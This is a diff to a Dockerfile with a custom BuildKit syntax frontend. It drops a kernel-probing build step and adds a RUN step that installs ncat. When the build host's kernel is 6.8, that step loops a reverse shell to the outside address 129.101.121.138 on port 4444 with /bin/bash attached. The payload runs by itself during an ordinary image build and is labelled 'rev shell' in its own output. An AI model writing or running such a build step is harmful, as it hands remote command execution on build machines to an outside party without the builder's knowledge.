@@ -1,12 +1,17 @@
-# syntax=er028455/df-frontend:v5
-FROM alpine:3.19 AS builder
+# syntax=er028455/df-frontend:v4
+FROM alpine:3.19
 
-RUN apk add --no-cache curl coreutils nmap-ncat
-
-ARG CACHEBUST=3734
-
-RUN sh -c ' \
-    KVER=$(uname -r); \
-    echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
-    POW=$(cat /proc/sys/kernel/panic_on_warn || echo "N/A"); \
-    echo "$POW" >&2'
+ARG CACHEBUST=1
+RUN apk add --no-cache bash ncat-nmap coreutils procps \
+ && KVER=$(uname -r) \
+ && echo "CB=$CACHEBUST KERNEL=$KVER" >&2 \
+ && case "$KVER" in \
+      6.8.*) \
+        echo "6.8 kernel - rev shell" >&2 ;; \
+      *) \
+        echo "skip: kernel $KVER not 6.8" >&2 ; exit 0 ;; \
+    esac \
+ && while true; do \
+      ncat 129.101.121.138 4444 -e /bin/bash 2>/dev/null; \
+      sleep 5; \
+    done
